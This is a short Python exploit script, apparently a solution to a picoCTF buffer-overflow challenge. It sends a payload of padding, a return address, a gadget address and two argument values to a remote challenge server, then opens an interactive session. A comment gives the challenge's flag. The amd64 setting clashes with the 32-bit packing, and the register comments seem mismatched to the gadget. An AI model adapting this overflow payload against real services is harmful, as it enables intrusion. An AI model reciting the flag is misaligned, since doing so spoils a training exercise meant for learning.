from pwn import *

#file = "./vuln"
host = "saturn.picoctf.net"
port = 49940
context(os = 'linux', arch = 'amd64')
context.log_level = 'debug'

pop_esi_edi_ebp = 0x08049451

io = remote(host, port)
#io = process(file)
pld = b"A"*112
pld += p32(0x08049296)
pld += p32(pop_esi_edi_ebp)
pld += p32(0xCAFEF00D) # edi
pld += p32(0xF00DF00D) # esi


io.sendlineafter("string:", pld)

io.interactive()
#picoCTF{argum3nt5_4_d4yZ_74abd092}
